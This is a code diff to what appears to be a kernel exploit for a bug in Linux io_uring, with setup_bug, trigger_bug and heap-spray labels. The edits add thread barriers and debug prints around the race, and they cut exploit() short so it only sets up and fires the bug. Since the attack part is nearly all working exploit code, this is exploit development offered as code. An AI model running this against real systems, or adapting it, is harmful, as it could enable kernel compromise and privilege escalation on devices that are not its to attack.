@@ -500,6 +500,7 @@ typedef struct {
   int read_poll_fd;
   pthread_t trigger_thread;
   pthread_barrier_t setup_barrier;
+  pthread_barrier_t setup_done_barrier;
   pthread_barrier_t trigger_barrier;
   char *buf;
 } Context;
@@ -558,20 +559,26 @@ void *trigger_thread(void *arg) {
 
   io_uring_submit_sqe(&context.io_uring, sqe);
   io_uring_enter_submit(&context.io_uring, 1);
-  io_uring_enter_poll(&context.io_uring, 1);
+  //io_uring_enter_poll(&context.io_uring, 1);
 
   struct io_uring_cqe *cqes = io_uring_get_cqe(&context.io_uring);
   printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
+  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);
+
+  pthread_barrier_wait(&context.setup_done_barrier);
 
   pthread_barrier_wait(&context.trigger_barrier);
 
   io_uring_enter_poll(&context.io_uring, 1);
+  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
+  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);
 
   return NULL;
 }
 
 void setup_bug() {
   init_barrier(&context.setup_barrier, 2);
+  init_barrier(&context.setup_done_barrier, 2);
   init_barrier(&context.trigger_barrier, 2);
   // context.read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK));
   context.read_poll_fd = SYSCHK(open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY | O_DIRECT | O_NONBLOCK));
@@ -583,6 +590,9 @@ void setup_bug() {
 
   // have other thread do 1 dummy poll
   pthread_barrier_wait(&context.setup_barrier);
+
+  // wait for it to finish
+  pthread_barrier_wait(&context.setup_done_barrier);
 
   struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
   memset(sqe, 0, sizeof(struct io_uring_sqe));
@@ -666,6 +676,10 @@ spray_256:
 }
 
 void exploit() {
+  setup_bug();
+  trigger_bug();
+  sleep(10);
+  return;
   int exp_pipes[4] = { 0 };
 
   // puts("trigger");
